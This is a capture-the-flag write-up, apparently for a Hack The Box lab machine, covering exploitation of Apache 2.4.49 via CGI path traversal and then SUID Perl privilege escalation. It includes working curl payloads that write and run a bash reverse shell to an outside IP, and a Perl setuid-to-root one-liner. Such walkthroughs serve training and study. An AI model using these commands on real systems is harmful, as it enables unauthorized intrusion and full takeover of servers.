# 🌐 ApacheCGI

#htb-veryeasy #path-traversal #cgi-bin #suid-priv-escalation

>[!todo]- Summary
>
>This room took me ~4hrs to fully complete - no full online guides were available so it was quite the challenge to research, piece bits together and explore.
>
> I thought this room would be similar to the [[Shocker]] machine since they are both to do with `cgi-bin`. They kind of are but the difference is that in Shocker I discovered an existing `.sh` file to get a reverse shell but in this room I created my own. The privilege escalation was also a lot harder.

---

# Initial Nmap Scan

To begin with I will perform an nmap scan to find out about the target machine:

```
sudo nmap -sC -sV -O -p- <target_ip> -v
```

- `-sC` - check for vulnerabilities with nmap default scripts
- `-sV` - get service/version info
- `-O` - enable OS detection
- `-v` - verbose output

**Nmap Output:**
![[nmap_output.png]]

The Nmap scan shows that two ports are open: 80 and 22
- Port 80 is running Apache httpd 2.4.49
- Port 22 is running OpenSSH 8.4p1 Debian 6 (protocol 2.0)

## Path Traversal and Reverse Shell

Searching for Apache 2.4.49 on [Exploit DB](https://www.exploit-db.com/exploits/50383) shows 1 associated vulnerability linked to path traversal and RCE.

The exploit script has a for loop to iterate through multiple hosts but since I only need to attack one target I can just take the curl part and modify it for my needs

```
# this is copied from exploitdb
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"
```

The above command can be edited to suit the needs for this box.

I have rewritten the script with help from [this video](https://youtu.be/WSVcuV2Wc58?t=321) and I now have these two commands to upload a reverse shell script:

\# make reverse shell script

```
curl 'http://10.129.96.43/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type: text/plain; echo; echo "#!/bin/bash" > /tmp/whiskey.sh'
```

```
curl 'http://10.129.96.43/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type: text/plain; echo; echo "bash -i >& /dev/tcp/10.10.14.3/4444 0>&1" >> /tmp/whiskey.sh'
```

To check that the two commands have worked I can use the command below to check the contents of the file I am using:

```
curl 'http://10.129.96.43/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type: text/plain; echo; cat /tmp/whiskey.sh'
```

![[Pasted image 20240301214732.png]]

Next I can start a listener to capture the reverse shell

\# Ncat listener for incoming reverse shell connection

![[Pasted image 20240301212948.png]]

\# execute the reverse shell with `bash`

```
curl 'http://10.129.96.43/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type: text/plain; echo; bash /tmp/whiskey.sh'
```

\# The curl command hangs - this is good!

![[Pasted image 20240301215031.png]]

\# Now I have a reverse shell

![[Pasted image 20240301215208.png]]

---

# 🤯 User Own

From this point where I have the reverse shell I can just use basic commands such as `ls`, `cd`, and `cat` to find the user flag:

![[Pasted image 20240301213215.png]]

---

# 🖥 System Own

Now to do the hard part 🙃.

This part took ~2hr40mins.

This was all about privilege escalation and I had no idea how to do it since there were no guides or writeups for this box published **anywhere**.

This meant tons and tons of googling and it was quite painful but the answer lied in [privilege escalation through exploiting a vulnerable SUID executable](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/#:~:text=3.-,Exploiting%20SUID%20Executables,-SUID%20which%20stands).

\# Command to find executables with SUID bit set

```
find / -perm -u=s -type f 2>/dev/null
```

If I run this command on the target machine I can see that the SUID bit is set for perl5.32.1.

Running `ls -la /usr/bin/perl5.32.1` shows that `root` is the owner.

This means that because the s bit is set when I run perl5.32.1 I can potentially run a perl script as root to get privilege escalation.

![[Pasted image 20240302003043.png]]

I then googled "perl suid privilege escalation" and found [this page](https://delinea.com/blog/linux-privilege-escalation) that contained the following command:

```
./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

However this threw an error that said:

```
Insecure $ENV{PATH} while running with -T switch at -e line 1.
```

The command just worked for the person who wrote it so I had to find a way around this error.

This is where my knowledge began to dry up again and I used ChatGPT to help me write the Perl script I needed. 

The missing part was `'BEGIN { $ENV{PATH} = "/bin:/usr/bin"; }` which sets the `PATH` environment variable to a known, safe list of directories before any other operation is performed. This is crucial for bypassing the `Insecure $ENV{PATH}` error.

\# Perl script that grants root access

```
./perl -e 'BEGIN { $ENV{PATH} = "/bin:/usr/bin"; } use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

or

```
/usr/bin/perl5.32.1 -e 'BEGIN { $ENV{PATH} = "/bin:/usr/bin"; } use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

![[Pasted image 20240302004605.png]]


---

# Dirbuster

Dirbuster can be used again websites to scan for directories that could be exploited.

The directory scan is setup like:

![[dirbuster_1.png]]

The scan found a few directories are files:

![[dirbuster_2.png]]

Since I have just done the [[Shocker]] room I know that `cgi-bin` can be vulnerable to [[ShellShock]] and therefore a reverse shell can be created.

> "..if you have a 403 on the `/cgi-bin/` directory, try to enumerates for files within that directory with a good wordlist, searching for `.sh` or `.cgi` extensions."
> \- [GitHub/b4keSn4ke/CVE-2014-6271](https://github.com/b4keSn4ke/CVE-2014-6271)

The above screenshot shows that we are getting a 403 response in the `cgi-bin` directory. According to the GitHub I should perform another Dirbuster scan:

![[dirbuster_3.png]]

This scan didn't yield any results so I am trying a [different wordlist](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/cgis.txt):

![[dirbuster_4.png]]

Changing a few settings and choosing different wordlists gave the following output:

![[dirbuster_6.png]]

---

# 🔗 Useful Links

- Apache 2.4.49 - Path Traversal & Remote Code Execution (RCE): [ExploitDB](https://www.exploit-db.com/exploits/50383)
- Video explaining Apache 2.4.49: [CVE-2021-41773](https://www.youtube.com/watch?v=WSVcuV2Wc58)
- Methods of Linux Priv Escalation: [Vulnerable SUID](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/#:~:text=3.-,Exploiting%20SUID%20Executables,-SUID%20which%20stands)
- Bypass local security with: [GTFOBins](https://gtfobins.github.io/#+suid)
